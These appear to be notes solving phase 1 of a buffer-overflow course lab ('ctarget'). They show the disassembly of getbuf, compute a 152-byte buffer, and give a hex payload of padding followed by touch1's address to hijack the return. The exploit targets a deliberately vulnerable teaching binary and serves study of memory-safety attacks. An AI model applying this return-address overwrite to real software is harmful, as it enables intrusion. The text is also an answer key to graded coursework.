PHASE - 1



objdump -d ctarget > ctarget.d



0000000000401615 <getbuf>:
  401615:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  40161c:	48 89 e7             	mov    %rsp,%rdi
  40161f:	e8 15 05 00 00       	call   401b39 <Gets>
  401624:	b8 01 00 00 00       	mov    $0x1,%eax
  401629:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  401630:	c3                   	ret    
  


0x98 = 152


0000000000401699 <touch1>:




00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
99 16 40 00 00 00 00 00




